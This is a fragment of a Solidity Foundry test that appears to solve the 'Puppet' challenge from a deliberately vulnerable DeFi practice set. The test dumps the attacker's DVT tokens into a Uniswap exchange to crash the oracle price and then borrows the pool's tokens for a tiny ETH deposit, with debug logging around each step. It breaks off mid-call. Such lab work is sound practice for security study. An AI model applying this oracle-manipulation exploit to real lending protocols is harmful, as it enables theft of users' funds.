...
contract Puppet is Test {
    ...
    function testExploit() public {
        ...
        emit log_named_uint("tokens for 1 eth", uniswapExchange.getTokenToEthInputPrice(1e18));
        emit log_named_uint("attacker balance", attacker.balance / 1e18);
        emit log_named_uint("attacker DVTs", dvt.balanceOf(attacker) / 1e18);
        emit log_named_uint(
            "puppet deposit required", puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE) / 1e18
        );
        emit log_named_uint("exchange eth", address(uniswapExchange).balance / 1e18);
        emit log_named_uint("exchange DVTs", dvt.balanceOf(address(uniswapExchange)) / 1e18);
        dvt.approve(address(uniswapExchange), dvt.balanceOf(attacker));
        // uint256 lpt =
        //     uniswapExchange.addLiquidity{value: attacker.balance}(1, dvt.balanceOf(attacker), block.timestamp + 5 days);
        emit log_named_uint("tokens for 1 eth", uniswapExchange.getTokenToEthInputPrice(1e18));
        // emit log_named_uint("LP tokens", lpt / 1e18);
        emit log_named_uint(
            "puppet deposit required", puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE) / 1e18
        );
        ...
        emit log_named_uint("exchange eth", address(uniswapExchange).balance / 1e18);
        emit log_named_uint("exchange DVTs", dvt.balanceOf(address(uniswapExchange)) / 1e18);
        uint256 obtainedEth = uniswapExchange.tokenToEthSwapInput(dvt.balanceOf(attacker), 1, block.timestamp + 5 days);
        emit log_named_uint("attacker balance", attacker.balance / 1e18);
        emit log_named_uint(
            "puppet deposit required", puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE) / 1e18
        );
        puppetPool.borrow{value: puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)}(
